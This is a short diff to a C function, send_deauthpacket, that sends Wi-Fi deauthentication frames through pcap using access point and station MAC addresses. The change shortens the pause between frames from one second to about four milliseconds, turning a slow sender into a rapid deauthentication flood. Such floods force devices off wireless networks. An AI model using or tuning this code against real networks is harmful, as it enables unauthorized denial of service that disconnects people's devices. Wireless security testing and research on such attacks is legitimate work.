@@ -46,7 +46,7 @@ int send_deauthpacket(char *dev, char *apmac, char *stmac, int argc) {
                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                 break;
             }
-            sleep(1);
+            usleep(3906);
             packet.deauth.dest = Mac(apmac);
             packet.deauth.source = Mac(stmac);
             packet.deauth.bssid = Mac(stmac);
@@ -56,7 +56,7 @@ int send_deauthpacket(char *dev, char *apmac, char *stmac, int argc) {
         if (res != 0) {
             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
         }
-        sleep(1);
+        usleep(3906);
     }
 
     pcap_close(handle);
